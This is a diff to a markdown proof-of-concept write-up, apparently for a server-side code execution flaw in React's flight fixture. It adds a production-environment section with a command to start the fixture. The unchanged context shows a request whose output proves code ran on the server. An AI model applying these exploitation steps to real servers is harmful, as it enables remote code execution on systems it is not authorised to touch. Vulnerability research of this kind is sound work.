@@ -44,6 +44,8 @@ Wait until you see logs indicating:
 
 ## 2. Exploit the Vulnerability
 
+# In Dev Environment:
+
 ### Step 3: Create a PoC Module
 
 In a second terminal (separate from the server terminal), create the proof-of-concept module:
@@ -101,6 +103,19 @@ EOF
   --data '[]' | strings | grep -F 'SERVER_EXEC'
 
 0:{"root":[[["$","link","static/css/main.76138ffd.css",{"rel":"stylesheet","href":"static/css/main.76138ffd.css","precedence":"default"},null,"$1",0]],"$L2"],"returnValue":"SERVER_EXEC pid=11016 node=v22.22.0 window=undefined","formState":null}
+```
+
+# In Prod Environment:
+
+Run the /react/fixtures/flight as production:
+
+```bash
+┌──(keshav㉿kali)-[~/Downloads/react/fixtures/flight]
+└─$ NODE_ENV=production /home/keshav/.nvm/versions/node/v20.20.0/bin/yarn start
+```
+
+
+
 
 
 ```
